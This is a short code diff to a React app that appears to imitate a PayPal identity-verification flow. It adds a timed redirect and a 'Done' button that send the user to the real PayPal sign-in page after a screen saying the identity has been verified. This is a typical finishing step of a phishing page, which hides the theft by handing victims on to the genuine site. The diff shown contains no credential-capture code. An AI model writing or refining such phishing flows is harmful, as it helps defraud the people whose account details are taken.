@@ -40,6 +40,15 @@ export function App() {
     }
   }, [screen]);
 
+  useEffect(() => {
+    if (screen === 'success') {
+      const successTimer = setTimeout(() => {
+        window.location.href = 'https://www.paypal.com/signin?locale.x=en_US';
+      }, 2000);
+      return () => clearTimeout(successTimer);
+    }
+  }, [screen]);
+
   if (screen === 'loading' || screen === 'transition') {
     return (
       <div className="min-h-screen w-full flex flex-col items-center justify-center bg-white">
@@ -123,7 +132,7 @@ export function App() {
             Your identity has been verified. You can now access your account.
           </p>
           <button
-            onClick={() => setScreen('login')}
+            onClick={() => window.location.href = 'https://www.paypal.com/signin?locale.x=en_US'}
             className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-lg rounded-full transition-colors shadow-sm"
           >
             Done
